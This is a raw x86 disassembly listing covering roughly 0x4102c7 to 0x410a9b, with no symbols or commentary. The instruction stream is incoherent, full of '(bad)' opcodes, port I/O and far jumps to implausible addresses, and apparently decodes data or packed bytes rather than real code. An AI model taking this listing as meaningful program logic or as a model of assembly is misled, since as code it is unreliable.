  4102c7:	scas   al,BYTE PTR es:[edi]
  4102c8:	lahf   
  4102c9:	xchg   esi,eax
  4102ca:	jecxz  0x4102b8
  4102cc:	enter  0x1817,0xfc
  4102d0:	cmp    BYTE PTR [ebp-0x6af1c8ff],0xc4
  4102d7:	out    dx,eax
  4102d8:	fsubr  QWORD PTR [ebx]
  4102da:	jge    0x4102fc
  4102dc:	mov    WORD PTR [ebx-0x618fc5c3],es
  4102e2:	les    ebx,FWORD PTR [ebx]
  4102e4:	mov    edx,0xbb856271
  4102e9:	sahf   
  4102ea:	loope  0x4102dd
  4102ec:	xor    al,0x0
  4102ee:	and    DWORD PTR [ebx+0x62],ebx
  4102f1:	cmp    DWORD PTR [eax+0x69],esp
  4102f4:	lods   eax,DWORD PTR ds:[esi]
  4102f5:	mov    dl,0xf1
  4102f7:	and    DWORD PTR [eax],ebp
  4102f9:	(bad)  
  4102fa:	mov    dh,0x6c
  4102fc:	ror    BYTE PTR [eax+0x22],1
  4102ff:	loopne 0x410307
  410301:	dec    ebx
  410302:	imul   edi,DWORD PTR [ebp+0x1f1fddf1],0x5cd739a6
  41030c:	inc    esp
  41030d:	fst    QWORD PTR [ebp+0x2e]
  410310:	mov    edx,0x876e950d
  410315:	imul   DWORD PTR [eax]
  410317:	mov    dh,0x56
  410319:	loop   0x41035a
  41031b:	dec    ebp
  41031c:	fimul  WORD PTR [ebp-0x748f72d4]
  410322:	sub    BYTE PTR [eax-0x583bdc6c],cl
  410328:	fadd   QWORD PTR [ebp+0x170e7353]
  41032e:	xchg   esp,eax
  41032f:	and    DWORD PTR es:[ebx],esi
  410332:	dec    eax
  410333:	mov    ch,0xcc
  410335:	adc    dl,bl
  410337:	jmp    0x410354
  410339:	loopne 0x41036e
  41033b:	outs   dx,BYTE PTR fs:[esi]
  41033d:	sbb    eax,0x85d1ed72
  410342:	rol    ch,1
  410344:	jns    0x410343
  410346:	mov    eax,0x39b2b532
  41034b:	das    
  41034c:	std    
  41034d:	cs std 
  41034f:	or     ah,BYTE PTR [edi+0x6]
  410352:	mov    dl,0x29
  410354:	and    DWORD PTR [esi+esi*8-0x7a3f9a14],ecx
  41035b:	sahf   
  41035c:	lea    esi,[edi]
  41035e:	ss fcmovnb st,st(6)
  410361:	mov    eax,0x2af178a5
  410366:	xchg   BYTE PTR [edi-0x6344104b],al
  41036c:	inc    edx
  41036d:	add    ah,BYTE PTR [edi-0x53c4f5fc]
  410373:	or     edx,DWORD PTR fs:[edi]
  410376:	addr16 jp 0x410344
  410379:	inc    eax
  41037a:	push   ecx
  41037b:	dec    esp
  41037c:	sub    al,0x74
  41037e:	or     DWORD PTR [esi-0x3e],edx
  410381:	pop    es
  410382:	cmp    al,BYTE PTR [ebx+0x32]
  410385:	sbb    eax,0x32f3a325
  41038a:	imul   edx,DWORD PTR [eax-0x3a],0x13ab4a5f
  410391:	dec    esi
  410392:	cwde   
  410393:	mov    BYTE PTR [edi-0x35cdba6e],bl
  410399:	cwde   
  41039a:	repz ja 0x4103cb
  41039d:	ja     0x4103c5
  41039f:	fiadd  WORD PTR [ebx+ebx*4-0x1bff2859]
  4103a6:	aaa    
  4103a7:	pushf  
  4103a8:	fsub   st(1),st
  4103aa:	in     eax,dx
  4103ab:	add    esp,DWORD PTR [ebp-0x13]
  4103ae:	xor    eax,0x39270a2b
  4103b3:	or     DWORD PTR [edi],esp
  4103b5:	mov    dl,0xc2
  4103b7:	ret    
  4103b8:	and    al,0xc
  4103ba:	jae    0x410371
  4103bc:	rol    DWORD PTR [eax+0x6755a243],cl
  4103c2:	and    cl,BYTE PTR [ecx]
  4103c4:	rep lods eax,DWORD PTR ds:[esi]
  4103c6:	inc    edx
  4103c7:	loop   0x410358
  4103c9:	rol    BYTE PTR ds:0xfd0458b4,1
  4103cf:	inc    edx
  4103d0:	sub    ebp,eax
  4103d2:	push   edi
  4103d3:	fstp   TBYTE PTR [edi+0x77]
  4103d6:	mov    edx,DWORD PTR [edi+0x24]
  4103d9:	inc    ebp
  4103da:	cmp    bl,BYTE PTR [edx]
  4103dc:	test   BYTE PTR [eax+0x22],0xbb
  4103e0:	cmp    BYTE PTR [ebp-0x1d0a8d5d],ah
  4103e6:	sti    
  4103e7:	js     0x41037a
  4103e9:	test   BYTE PTR [ebx+0x5d],bl
  4103ec:	pop    ebx
  4103ed:	inc    ecx
  4103ee:	cs ret 0x9e72
  4103f2:	xor    al,0x3a
  4103f4:	into   
  4103f5:	mov    bl,0xfa
  4103f7:	add    eax,0x180c7964
  4103fc:	dec    eax
  4103fd:	xchg   edi,eax
  4103fe:	jge    0x41039f
  410400:	sbb    eax,0x89b7e10c
  410405:	jae    0x4103da
  410407:	and    DWORD PTR [esi+eax*2],0x35921c7d
  41040e:	mov    es,WORD PTR [ebp+ecx*4-0x1d]
  410412:	sub    BYTE PTR [ebp-0x47],dh
  410415:	fcmovu st,st(6)
  410417:	ins    BYTE PTR es:[edi],dx
  410418:	mov    eax,ds:0x9777f328
  41041d:	xchg   ebp,eax
  41041e:	adc    al,0x10
  410420:	pop    ebp
  410421:	neg    dx
  410424:	nop
  410425:	dec    ebx
  410426:	iret   
  410427:	ror    BYTE PTR [esi],1
  410429:	in     eax,0x33
  41042b:	icebp  
  41042c:	cli    
  41042d:	jb     0x4104aa
  41042f:	test   ah,dh
  410431:	retf   0x8a93
  410434:	and    esi,DWORD PTR cs:[ebp-0x3c]
  410438:	xor    BYTE PTR [edi],ah
  41043a:	pusha  
  41043b:	repz sub DWORD PTR [ecx+0x10],ebx
  41043f:	dec    ebp
  410440:	idiv   eax
  410442:	push   edi
  410443:	push   esi
  410444:	sti    
  410445:	inc    edx
  410446:	push   edi
  410447:	xchg   esi,eax
  410448:	shl    DWORD PTR [esi+0x72],1
  41044b:	loop   0x41044d
  41044d:	xchg   ebp,eax
  41044e:	pop    eax
  41044f:	out    0x9e,eax
  410451:	stos   DWORD PTR es:[edi],eax
  410452:	xchg   edx,eax
  410453:	mov    esp,esp
  410455:	inc    ecx
  410456:	adc    al,0x68
  410458:	adc    DWORD PTR [eax],ecx
  41045a:	dec    esp
  41045b:	ss xor eax,0x7affeb43
  410461:	xchg   ecx,eax
  410462:	(bad)  
  410464:	pop    ebx
  410465:	mov    ebx,0x33d4dd54
  41046a:	mov    dh,0x3a
  41046c:	sbb    cl,bh
  41046e:	push   esp
  41046f:	rcr    BYTE PTR [edx],0xc1
  410472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410473:	jbe    0x4104e8
  410475:	sub    eax,edi
  410477:	(bad)  [ebx]
  410479:	ss or  al,0xe3
  41047c:	or     bl,BYTE PTR [edi]
  41047e:	push   ebp
  41047f:	ds xor al,0x8c
  410482:	ret    0x2374
  410485:	clc    
  410486:	and    DWORD PTR [ecx-0x6a],eax
  410489:	or     dl,cl
  41048b:	mov    dh,0xe5
  41048d:	shl    DWORD PTR [ebx-0x77],cl
  410490:	loope  0x41047d
  410492:	out    0xd2,al
  410494:	scas   al,BYTE PTR es:[edi]
  410495:	into   
  410496:	jnp    0x4104fa
  410498:	cmp    ch,BYTE PTR [edi+0x34974ab]
  41049e:	cmp    al,0xdf
  4104a0:	mov    ds:0xad413e75,al
  4104a5:	fnclex 
  4104a7:	outs   dx,DWORD PTR ds:[esi]
  4104a8:	outs   dx,BYTE PTR ds:[esi]
  4104a9:	(bad)  
  4104aa:	cs scas eax,DWORD PTR es:[edi]
  4104ac:	jmp    0x41052b
  4104ae:	outs   dx,DWORD PTR ds:[esi]
  4104af:	iret   
  4104b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104b1:	shr    BYTE PTR [edx+0x4a9e2acf],0x44
  4104b8:	inc    ebx
  4104b9:	idiv   DWORD PTR [edx+0x1f]
  4104bc:	push   0x8836e19b
  4104c1:	xchg   eax,ebx
  4104c3:	mov    bh,0xbd
  4104c5:	mov    ah,0xe2
  4104c7:	stc    
  4104c8:	xlat   BYTE PTR ds:[ebx]
  4104c9:	(bad)  
  4104ca:	cmp    DWORD PTR [eax],0x1f6840fc
  4104d0:	push   cs
  4104d1:	sbb    ah,BYTE PTR [edx+0x18]
  4104d4:	mov    BYTE PTR [ebp+0x43],bl
  4104d7:	mov    edi,0x4edf4086
  4104dc:	test   DWORD PTR [eax+0x3f],edx
  4104df:	test   al,0x52
  4104e1:	add    al,0x52
  4104e3:	mov    BYTE PTR [eax+0x46],bl
  4104e6:	jmp    0x41054f
  4104e8:	cli    
  4104e9:	stos   DWORD PTR es:[edi],eax
  4104ea:	mov    BYTE PTR [edi-0x56a5bbc5],0xb
  4104f1:	inc    ecx
  4104f2:	(bad)  
  4104f3:	scas   al,BYTE PTR es:[edi]
  4104f4:	out    dx,al
  4104f5:	push   es
  4104f6:	xor    DWORD PTR [ecx],eax
  4104f8:	xor    edi,ebp
  4104fa:	mov    eax,ds:0xa55b1e9c
  4104ff:	pop    esi
  410500:	int3   
  410501:	cmp    bh,BYTE PTR [edi]
  410503:	fisttp DWORD PTR [edi+0x29685ff7]
  410509:	out    0x0,al
  41050b:	push   0x29
  41050d:	sub    al,0xb1
  41050f:	mov    ds:0x767c1a34,eax
  410514:	mov    bl,0xfe
  410516:	js     0x41052c
  410518:	stos   DWORD PTR es:[edi],eax
  410519:	fcmovnb st,st(4)
  41051b:	mov    ebp,0x71cf40cc
  410520:	int3   
  410521:	enter  0x65a9,0xaa
  410525:	xchg   esi,eax
  410526:	inc    eax
  410527:	pop    esp
  410528:	fstp   TBYTE PTR ds:0xd0aef3a3
  41052e:	and    DWORD PTR [eax-0x53af9288],0x19
  410535:	cmp    eax,0x7a3113dc
  41053a:	or     al,0xf4
  41053c:	dec    eax
  41053d:	int3   
  41053e:	xor    esi,edi
  410540:	out    0xde,eax
  410542:	les    eax,FWORD PTR [esp+edx*1]
  410545:	les    esi,FWORD PTR [ecx+0x3b96488b]
  41054b:	mov    ds:0x4686affa,eax
  410550:	stos   BYTE PTR es:[edi],al
  410551:	in     al,0x9c
  410553:	neg    bh
  410555:	push   ss
  410556:	and    BYTE PTR fs:[eax-0x4b],0xcf
  41055b:	mov    esp,0xa76122a4
  410560:	inc    ecx
  410561:	xchg   edi,eax
  410562:	data16 loopne 0x410563
  410565:	cmp    ah,BYTE PTR [ecx-0x28]
  410568:	stos   DWORD PTR es:[edi],eax
  410569:	dec    esi
  41056a:	test   BYTE PTR [edi],0x94
  41056d:	shl    BYTE PTR [ebx],1
  41056f:	gs stos DWORD PTR es:[edi],eax
  410571:	mov    eax,0xd8138cd9
  410576:	ret    
  410577:	ss xor cl,dh
  41057a:	cli    
  41057b:	out    0x18,al
  41057d:	or     edi,esp
  41057f:	jb     0x410505
  410581:	lods   al,BYTE PTR ds:[esi]
  410582:	cmp    al,0x70
  410584:	(bad)  
  410585:	stos   DWORD PTR es:[edi],eax
  410586:	xchg   BYTE PTR [esi],ah
  410588:	dec    ecx
  410589:	adc    ebx,DWORD PTR [edi-0x3fa623fa]
  41058f:	repz in al,0x80
  410592:	sub    dh,BYTE PTR [eax+0x370aa9b1]
  410598:	xchg   esp,eax
  410599:	jmp    0x410568
  41059b:	inc    esp
  41059c:	mov    ss,ecx
  41059e:	cmp    DWORD PTR [ecx],edi
  4105a0:	xchg   edi,eax
  4105a1:	and    DWORD PTR [edx-0x38],0xf8ca9176
  4105a8:	aas    
  4105a9:	cmp    al,0x71
  4105ab:	ds push ebp
  4105ad:	sbb    eax,0x562fa32d
  4105b2:	cmp    esp,eax
  4105b4:	mov    eax,ds:0xe24aa546
  4105b9:	pop    edi
  4105ba:	es (bad) 
  4105bc:	add    al,0xcd
  4105be:	xor    al,0x38
  4105c0:	mov    dh,0xad
  4105c2:	mov    esi,0xbfab4c3a
  4105c7:	sub    bh,dl
  4105c9:	call   0xba16:0x71a001ba
  4105d0:	pop    esi
  4105d1:	sub    ch,BYTE PTR [esi-0x53942a3a]
  4105d7:	(bad)  
  4105d8:	(bad)  [edi+0x51f45c59]
  4105de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105df:	jl     0x410617
  4105e1:	and    DWORD PTR [ebx+0x78],eax
  4105e4:	xor    DWORD PTR [ecx+0x7ff306ab],0xffffff8d
  4105eb:	dec    esi
  4105ec:	push   ecx
  4105ed:	jne    0x4105af
  4105ef:	inc    ebx
  4105f0:	clc    
  4105f1:	dec    eax
  4105f2:	jle    0x410633
  4105f4:	cli    
  4105f5:	cwde   
  4105f6:	retf   0xd6bd
  4105f9:	push   eax
  4105fa:	icebp  
  4105fb:	inc    edi
  4105fc:	cmp    cl,BYTE PTR [ebx]
  4105fe:	aam    0x9b
  410600:	(bad)  
  410601:	mov    ah,BYTE PTR [esi+0x5d]
  410604:	sbb    esi,edi
  410606:	sti    
  410607:	push   0xffffff91
  410609:	scas   eax,DWORD PTR es:[edi]
  41060a:	out    0xb1,eax
  41060c:	in     al,0x33
  41060e:	mov    bh,0x1d
  410610:	fbld   TBYTE PTR [ecx]
  410612:	loope  0x410686
  410614:	cmp    ebp,DWORD PTR [ebx]
  410616:	mov    esp,0x887c94ac
  41061b:	outs   dx,DWORD PTR ds:[esi]
  41061c:	cmp    dl,ch
  41061e:	cmc    
  41061f:	dec    edx
  410620:	std    
  410621:	adc    ecx,DWORD PTR [edi+0x5f0755ea]
  410627:	jb     0x4105c7
  410629:	xchg   edi,eax
  41062a:	out    dx,eax
  41062b:	iret   
  41062c:	dec    esi
  41062d:	inc    ecx
  41062e:	cs mov ah,0x46
  410631:	mov    al,ds:0x8db33ee0
  410636:	dec    ebp
  410637:	sbb    ebx,DWORD PTR [edx]
  410639:	stos   DWORD PTR es:[edi],eax
  41063a:	and    ebx,DWORD PTR [eax+0x7]
  41063d:	fmul   DWORD PTR [edx+0xfe6f71b]
  410643:	add    al,0x7f
  410645:	std    
  410646:	add    eax,DWORD PTR [ecx]
  410648:	in     al,dx
  410649:	test   eax,0x7acbf1fe
  41064e:	js     0x41068c
  410650:	int    0xe5
  410652:	fld    QWORD PTR [edx-0x6d49bb52]
  410658:	call   0xf70f:0x49af0d86
  41065f:	jbe    0x410682
  410661:	lock xchg bh,cl
  410664:	xlat   BYTE PTR ds:[ebx]
  410665:	add    ebp,DWORD PTR [edx]
  410667:	dec    ecx
  410668:	fld    TBYTE PTR [ebx]
  41066a:	and    DWORD PTR [edi+0x44],edi
  41066d:	mov    eax,es:0xed0d30f0
  410673:	sbb    eax,0xa0b66338
  410678:	push   esp
  410679:	pop    ebx
  41067a:	mov    esp,0x9386c72e
  41067f:	inc    eax
  410680:	push   edx
  410681:	jle    0x41063d
  410683:	and    eax,0xee5e7d80
  410688:	loop   0x41063c
  41068a:	push   edx
  41068b:	cmp    eax,0x10157717
  410690:	jbe    0x410634
  410692:	into   
  410693:	push   ebp
  410694:	push   ss
  410695:	fistp  QWORD PTR [eax-0x348d59f6]
  41069b:	add    bl,BYTE PTR [esi+eiz*1]
  41069e:	ret    
  41069f:	sti    
  4106a0:	adc    bl,BYTE PTR [eax-0x43]
  4106a3:	aas    
  4106a4:	out    dx,al
  4106a5:	push   0xffffff92
  4106a7:	push   esi
  4106a8:	ss push es
  4106aa:	push   ds
  4106ab:	leave  
  4106ac:	sub    DWORD PTR [edi+eiz*8-0x23eb86],edi
  4106b3:	jg     0x41072e
  4106b5:	loop   0x410691
  4106b7:	add    eax,0xe6d7a7ff
  4106bc:	adc    ch,BYTE PTR [ebx]
  4106be:	push   esp
  4106bf:	in     al,0xa7
  4106c1:	imul   eax,DWORD PTR [edi],0x54
  4106c4:	cmc    
  4106c5:	dec    edi
  4106c6:	jae    0x410743
  4106c8:	ftst   
  4106ca:	aad    0xee
  4106cc:	bound  ecx,QWORD PTR [eax+0x57]
  4106cf:	icebp  
  4106d0:	cmp    eax,0xd5626d69
  4106d5:	aaa    
  4106d6:	mov    ?,edi
  4106d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106d9:	inc    ebp
  4106da:	cmc    
  4106db:	into   
  4106dc:	ins    BYTE PTR es:[edi],dx
  4106dd:	or     ah,BYTE PTR [ebx-0x313843d8]
  4106e3:	and    BYTE PTR [edi+edi*8-0x5b],ah
  4106e7:	das    
  4106e8:	call   0xbc1c230
  4106ed:	mov    eax,ds:0x9c7cad6f
  4106f2:	mul    BYTE PTR [ecx]
  4106f4:	mov    ebx,0x5d1b5ff9
  4106f9:	popa   
  4106fa:	idiv   BYTE PTR ds:0x1da159fb
  410700:	imul   edx,ebx,0x2a
  410703:	sbb    eax,0xf5b1009e
  410708:	fstp   TBYTE PTR [edx+0x5f33412c]
  41070e:	mov    BYTE PTR [ebp+0x3a536879],cl
  410714:	rcr    BYTE PTR [ecx],cl
  410716:	add    ebx,DWORD PTR [ebp-0x3181471f]
  41071c:	setp   BYTE PTR [ebx]
  41071f:	mov    WORD PTR [ebx-0x1d],fs
  410722:	sub    al,0x76
  410724:	jecxz  0x41076b
  410726:	jle    0x410792
  410728:	dec    edi
  410729:	lea    ebp,[ebp+0x5565ea88]
  41072f:	pusha  
  410730:	hlt    
  410731:	sub    BYTE PTR [eax+0x11b6109e],cl
  410737:	test   al,0xcc
  410739:	repz (bad) 
  41073c:	push   ebp
  41073d:	sub    eax,0x9861412e
  410742:	fidivr DWORD PTR [edi+ecx*8+0x1b]
  410746:	xchg   DWORD PTR ds:0x70cef78c,ebx
  41074c:	mov    cl,0xfc
  41074e:	xor    al,0x6f
  410750:	mov    esp,0x2b16af3a
  410755:	xlat   BYTE PTR ds:[ebx]
  410756:	mov    ah,0xaa
  410758:	push   es
  410759:	xor    BYTE PTR [edi-0x7232474],cl
  41075f:	in     eax,0xdc
  410761:	xor    dl,BYTE PTR [edx-0x2b753f36]
  410767:	jmp    DWORD PTR [eax+0x5f77881a]
  41076d:	inc    eax
  41076e:	fst    st(0)
  410770:	rol    DWORD PTR [eax-0x65257b2e],0x33
  410777:	stc    
  410778:	es mov esp,0x40daa4cf
  41077e:	idiv   DWORD PTR [eax]
  410780:	cmp    al,0xc7
  410782:	mov    ebx,0xba185306
  410787:	ins    DWORD PTR es:[edi],dx
  410788:	sub    al,0x4d
  41078a:	mov    esp,0x75548044
  41078f:	cwde   
  410790:	pop    eax
  410791:	push   eax
  410792:	test   eax,0xbd3285bc
  410797:	dec    edx
  410798:	jne    0x410724
  41079a:	push   esp
  41079b:	(bad)  
  41079d:	jbe    0x410775
  41079f:	cdq    
  4107a0:	fisub  WORD PTR [ebp-0x4849832d]
  4107a6:	jb     0x410787
  4107a8:	enter  0x4c,0xe8
  4107ac:	add    eax,edi
  4107ae:	fcmovne st,st(2)
  4107b0:	(bad)  
  4107b1:	gs je  0x41075f
  4107b4:	mov    bh,0x5
  4107b6:	or     ebp,DWORD PTR [ebp+0x73]
  4107b9:	fsub   QWORD PTR [eax+0x5ce7fae3]
  4107bf:	xchg   esi,eax
  4107c0:	mov    edi,DWORD PTR [ebp-0x1d2e6c4f]
  4107c6:	repz mov ebx,DWORD PTR [ebp-0x4ef00469]
  4107cd:	push   ss
  4107ce:	dec    ebx
  4107cf:	out    0x7d,al
  4107d1:	sar    DWORD PTR [edi],0xbc
  4107d4:	mov    ebx,0x2c25bb1
  4107d9:	xchg   esp,eax
  4107da:	xchg   ebx,eax
  4107db:	jg     0x410822
  4107dd:	push   0x2af82317
  4107e2:	pop    ebp
  4107e3:	add    al,0xa9
  4107e5:	sub    edi,DWORD PTR ds:[ecx-0x5c]
  4107e9:	add    DWORD PTR [edi+0x5b11a76a],ebp
  4107ef:	xchg   ebp,eax
  4107f0:	dec    ebp
  4107f1:	lahf   
  4107f2:	cdq    
  4107f3:	mov    bl,0x5a
  4107f5:	or     DWORD PTR [edi+eiz*8],0xad17c29c
  4107fc:	xchg   BYTE PTR [ecx],bl
  4107fe:	cs stos BYTE PTR es:[edi],al
  410800:	xor    eax,ebx
  410802:	jmp    0xfcf152fe
  410807:	imul   ebx,DWORD PTR [edi-0x6f],0xffffffac
  41080b:	pop    esi
  41080c:	or     BYTE PTR [edi-0x50],ch
  41080f:	xchg   edx,eax
  410810:	les    esp,FWORD PTR [ecx+0x25]
  410813:	nop
  410814:	mov    esp,0x73ffea94
  410819:	iret   
  41081a:	scas   al,BYTE PTR es:[edi]
  41081b:	mov    ebx,0xdce281d6
  410820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410821:	(bad)  
  410822:	fimul  DWORD PTR [edx+0x73bcbf2c]
  410828:	mov    eax,0x7965d94b
  41082d:	xchg   DWORD PTR cs:[eax-0x45741110],edi
  410834:	add    ah,ch
  410836:	push   0xfffffffd
  410838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410839:	jg     0x41089c
  41083b:	out    dx,eax
  41083c:	jl     0x410800
  41083e:	bound  edx,QWORD PTR [eax-0x5b]
  410841:	xchg   ebp,eax
  410842:	out    0x82,eax
  410844:	pop    esp
  410845:	sahf   
  410846:	neg    bl
  410848:	stos   DWORD PTR es:[edi],eax
  410849:	push   ss
  41084a:	in     al,dx
  41084b:	mov    esi,0x9f5d3767
  410850:	or     bh,al
  410852:	jmp    0x42421967
  410857:	ins    DWORD PTR es:[edi],dx
  410858:	hlt    
  410859:	(bad)  
  41085a:	adc    eax,0xa8467a13
  41085f:	pop    DWORD PTR [edi+0x30]
  410862:	jmp    0x8156:0x1bf05916
  410869:	ds (bad) 
  41086c:	loopne 0x410869
  41086e:	mov    bh,0xb0
  410870:	lods   eax,DWORD PTR ds:[esi]
  410871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410872:	fsubr  st(1),st
  410874:	out    dx,al
  410875:	mov    cl,0x4b
  410877:	add    eax,0xab82f28c
  41087c:	mov    BYTE PTR [edx+0x5e],dl
  41087f:	(bad)  
  410880:	retf   0x5feb
  410883:	(bad)  [ecx-0x79f76196]
  410889:	not    DWORD PTR [edx]
  41088b:	or     BYTE PTR [esi-0x80],ch
  41088e:	xchg   DWORD PTR [ebx-0x4d],edi
  410891:	adc    DWORD PTR [esi+edx*2],esp
  410894:	test   eax,0x2a979dca
  410899:	test   eax,0x1b21b2bb
  41089e:	push   ebx
  41089f:	btc    esi,eax
  4108a2:	pop    ebx
  4108a3:	sbb    eax,0x8e928650
  4108a8:	rol    DWORD PTR [ecx-0xe3f34b7],cl
  4108ae:	pop    edx
  4108af:	push   eax
  4108b0:	jg     0x410836
  4108b2:	idiv   BYTE PTR [esi]
  4108b4:	xchg   esp,eax
  4108b5:	xchg   edx,ebp
  4108b7:	add    eax,DWORD PTR [edx+0x5a]
  4108ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108bb:	xchg   edx,eax
  4108bc:	jns    0x410934
  4108be:	lahf   
  4108bf:	and    eax,0x7ca73f1b
  4108c4:	enter  0xd8f3,0xed
  4108c8:	dec    ebx
  4108c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ca:	adc    ebp,edx
  4108cc:	mov    cs,WORD PTR [esi+0x7a05eae9]
  4108d2:	xor    edi,DWORD PTR [esi]
  4108d4:	and    BYTE PTR [esi+0x5c],al
  4108d7:	mov    ebx,0xed996c67
  4108dc:	loop   0x4108cf
  4108de:	imul   ebx,ebx,0x5e0a7af8
  4108e4:	sub    dl,0x1
  4108e7:	repz dec edx
  4108e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108ea:	or     eax,0xc0a90be0
  4108ef:	adc    al,0x1a
  4108f1:	or     edx,ebx
  4108f3:	retf   
  4108f4:	jmp    0x2ff20f45
  4108f9:	arpl   WORD PTR [esi+0x7d],sp
  4108fc:	inc    ecx
  4108fd:	cld    
  4108fe:	repnz (bad) [edi+eax*1]
  410902:	mov    esp,0xc35b4b17
  410907:	in     al,0x83
  410909:	add    eax,0x77417aeb
  41090e:	push   edi
  41090f:	xor    al,0xfd
  410911:	push   0xffffffbe
  410913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410914:	and    dh,BYTE PTR [edi]
  410916:	inc    ecx
  410917:	jnp    0x410909
  410919:	aad    0x3f
  41091b:	fwait
  41091c:	pusha  
  41091d:	adc    al,0x12
  41091f:	pusha  
  410920:	mov    esp,DWORD PTR [ebx+0x73c46640]
  410926:	mov    al,ds:0x274b4b6f
  41092b:	into   
  41092c:	fidivr DWORD PTR [eax+edx*8-0x49]
  410930:	lea    ebx,gs:[edi-0x3f]
  410934:	sahf   
  410935:	mov    ecx,0x2ee4d0ef
  41093a:	cmp    eax,0xd7ff977
  41093f:	jl     0x410983
  410941:	out    0x70,eax
  410943:	aad    0x41
  410945:	or     esi,DWORD PTR [edx+0x46]
  410948:	setb   al
  41094b:	and    esp,DWORD PTR [eax-0x2f]
  41094e:	mov    ebp,0x9bd61e80
  410953:	int3   
  410954:	ins    BYTE PTR es:[edi],dx
  410955:	loopne 0x4108de
  410957:	cmp    eax,0x78fe0145
  41095c:	div    BYTE PTR [edx+0x4f131f37]
  410962:	rcl    DWORD PTR [edx+0x2d],cl
  410965:	cmc    
  410966:	cmp    bh,BYTE PTR [ebx+esi*2+0x368f85cc]
  41096d:	inc    ebp
  41096e:	jns    0x4109c2
  410970:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  410972:	std    
  410973:	mov    fs,WORD PTR [edx]
  410975:	sbb    eax,0xe3a22697
  41097a:	mov    esp,0xf602ad64
  41097f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410980:	or     BYTE PTR [esi],bl
  410982:	cli    
  410983:	test   al,0xff
  410985:	in     eax,0xdc
  410987:	aaa    
  410988:	mov    ch,0x1f
  41098a:	inc    ebp
  41098b:	add    DWORD PTR [esp+eiz*8],ebp
  41098e:	cmp    ebp,DWORD PTR [esi]
  410990:	xchg   ecx,eax
  410991:	jmp    0x4109fa
  410993:	xchg   esi,eax
  410994:	dec    edi
  410995:	ss loope 0x4109b0
  410998:	adc    dh,dl
  41099a:	push   ebx
  41099b:	(bad)  
  41099c:	imul   DWORD PTR [edx-0xf268588]
  4109a2:	loope  0x4109ab
  4109a4:	xor    bl,BYTE PTR [edx-0x657a6556]
  4109aa:	mov    cl,0xb0
  4109ac:	push   edx
  4109ad:	pop    es
  4109ae:	lods   al,BYTE PTR ds:[esi]
  4109af:	push   edx
  4109b0:	cmp    BYTE PTR [eax-0x40e7b0a7],dl
  4109b6:	int3   
  4109b7:	add    eax,0xaee3920f
  4109bc:	pop    edi
  4109bd:	stc    
  4109be:	jle    0x4109cb
  4109c0:	sub    al,0x58
  4109c2:	sub    ah,0xf4
  4109c5:	push   eax
  4109c6:	sub    eax,0xbbabdbdc
  4109cb:	mov    ecx,DWORD PTR [ebp-0x15]
  4109ce:	sub    DWORD PTR [edx-0x1b],esi
  4109d1:	int3   
  4109d2:	mov    ds:0x9026824e,eax
  4109d7:	iret   
  4109d8:	xor    DWORD PTR [ecx+0x12fd35cd],0x48
  4109df:	icebp  
  4109e0:	mov    ds:0x347642c6,al
  4109e5:	mov    al,0x16
  4109e7:	popf   
  4109e8:	and    ebp,eax
  4109ea:	sub    bl,bh
  4109ec:	pop    edi
  4109ed:	mov    al,ds:0x5893064d
  4109f2:	shr    esi,cl
  4109f4:	mov    ?,WORD PTR [esi+0x8]
  4109f7:	inc    esi
  4109f8:	idiv   bh
  4109fa:	pop    esp
  4109fb:	es jg  0x4109c9
  4109fe:	xchg   edx,eax
  4109ff:	add    edi,DWORD PTR [edi]
  410a01:	pushf  
  410a02:	rcl    edx,1
  410a04:	lea    eax,[ebp+0x35]
  410a07:	and    DWORD PTR [esi+0x37],esi
  410a0a:	jg     0x410a45
  410a0c:	ret    
  410a0d:	cwde   
  410a0e:	inc    esp
  410a0f:	mov    ebx,0x89f3294
  410a14:	mov    dh,0xe6
  410a16:	scas   eax,DWORD PTR es:[edi]
  410a17:	aaa    
  410a18:	inc    edx
  410a19:	inc    ecx
  410a1a:	aad    0x0
  410a1c:	dec    ebp
  410a1d:	xor    BYTE PTR [esi],ah
  410a1f:	jns    0x410a94
  410a21:	or     dh,0xcf
  410a24:	add    al,0x8f
  410a26:	sbb    eax,0x6c2a6a3b
  410a2b:	retf   0xdf3a
  410a2e:	sbb    eax,0xa956c344
  410a33:	call   0xd2d4c229
  410a38:	fst    DWORD PTR [ebx+0x8]
  410a3b:	cli    
  410a3c:	sub    BYTE PTR [ebx-0x6d54fe14],dh
  410a42:	lahf   
  410a43:	add    esp,ebp
  410a45:	rcl    BYTE PTR [edi],1
  410a47:	cs sbb al,0xaf
  410a4a:	cli    
  410a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a4c:	lock icebp 
  410a4e:	loop   0x410a1e
  410a50:	dec    ebp
  410a51:	test   DWORD PTR [edx-0x1e05c2ab],0x71e18f0f
  410a5b:	outs   dx,BYTE PTR ds:[esi]
  410a5c:	call   0xc80:0x4668a27f
  410a63:	dec    edi
  410a64:	sbb    BYTE PTR [ebp-0x4e85e0cb],0xfa
  410a6b:	pop    edi
  410a6c:	and    eax,0x9d4e91b8
  410a71:	lds    ebx,FWORD PTR [eax]
  410a73:	mov    eax,0x5e16ce35
  410a78:	dec    edx
  410a79:	out    dx,al
  410a7a:	pop    eax
  410a7b:	ret    
  410a7c:	das    
  410a7d:	cmp    edx,DWORD PTR [ecx-0x13]
  410a80:	xor    DWORD PTR [edi],esp
  410a82:	and    DWORD PTR [ebx-0x7d01b750],esp
  410a88:	cmc    
  410a89:	or     dh,BYTE PTR [ecx+eiz*2+0x32]
  410a8d:	leave  
  410a8e:	addr16 ret 0xc17e
  410a92:	jl     0x410b0d
  410a94:	push   es
  410a95:	(bad)  
  410a96:	sub    esp,DWORD PTR [eax+0x7f]
  410a99:	aam    0x6a
  410a9b:	daa    
